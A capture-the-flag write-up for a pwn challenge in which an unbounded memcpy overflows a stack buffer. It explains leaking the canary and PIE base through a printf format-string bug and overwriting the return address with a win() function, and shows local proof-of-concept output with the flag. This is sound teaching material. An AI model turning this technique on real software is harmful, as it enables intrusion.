# **Lone Survivor - Pwn Challenge Writeup**

## **Challenge Overview**

* **Category**: Pwn
* **Author**: [Spinel99](https://github.com/MedjberAbderrahim)
* **Synopsis**: A tiny menu-driven arena where you “forge” and “ready” a weapon. The program copies an oversized forged buffer into a smaller stack buffer, letting us smash the stack and reach the hidden `win()` function that prints the flag.

## **Environment**

* **Protections**:
```pwndbg
pwndbg> checksec
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

## **Static Analysis**

The binary keeps an on-heap buffer `armament` (0x100 bytes) and later copies it onto the stack (`readied_weapon`, 0x40 bytes) via `memcpy(readied_weapon, armament, readen)`. There is no bounds check on `readen`, so writing more than 0x40 bytes lets us overflow the stack frame and control RIP despite the canary being present.
```c
if ( choice != 2 )
    break;
puts("\nThe hour of reckoning approaches...");
printf("Readying armament");
fflush(stdout);
for ( i = 0; i <= 2; ++i ) {
    usleep(0x493E0u);
    putchar(46);
    fflush(stdout);
}
memcpy(readied_weapon, armanent, readen);
puts(" 'Tis done.\n");
```

## **Exploitation Strategy**

1. **Leak canary & PIE**: The name prompt is printed back with `printf(name)`, so a `%p%p` format string yields both a PIE leak and the stack canary.
2. **Forge payload**: Send menu option 1 with a payload that keeps padding up to the canary, repeats the leaked canary, restores RBP, and overwrites RIP with `win()` (plus a `ret` gadget for alignment).
3. **Trigger copy**: Choose option 2 to `memcpy` the oversized payload into `readied_weapon`, then option 3 to exit and return into `win()`, which prints the flag.

## **Solve Script**

The full solver is provided in [`exploit.py`](./exploit.py).

## **Proof of Concept**

Running locally:
```sh
$ ./exploit.py REMOTE
[+] Opening connection to localhost on port 10001: Done
exe.address: 0x55905145c000
Canary: 0xf113770d44514b00
[*] Switching to interactive mode
flag{0h_L0n3_5urv1v3r_,_1_41w4y5_b3li3v3d_1n_y0u_...}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to localhost port 10001
```

## **Final Notes**

Simple, clean stack overflow with a handy format-string leak—perfect warm-up pwn. Happy hacking!